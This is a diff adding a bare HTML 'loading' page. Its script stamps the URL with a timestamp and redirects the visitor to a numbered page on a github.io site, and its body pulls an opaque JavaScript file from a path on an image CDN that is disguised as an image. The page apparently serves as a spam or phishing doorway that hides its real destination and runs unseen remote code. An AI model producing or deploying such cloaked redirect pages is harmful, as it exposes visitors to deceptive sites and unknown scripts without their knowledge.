@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>—...加载中...</title>
+    <script>
+      function checkAndAddTimestampParam() {
+        var timestamp = new Date().getTime();
+        var currentUrl = window.location.href;
+        var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
+        if (hasTimestampParam) {
+          window.location.replace('https://chuyin2.github.io/5S7L0332135.html?_t=' + timestamp);
+        } else {
+          var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
+          window.location.replace(newUrl)
+        }
+      }
+      window.onload = function() {
+        checkAndAddTimestampParam();
+      }
+    </script>
+  </head>
+  <body>
+  <script type="text/javascript" charset="utf-8" src="//crossfb-70080.picnjc.qpic.cn/g.52000000-r.e620f/1680755552306_hf_0"></script>
+</body>
+</html>
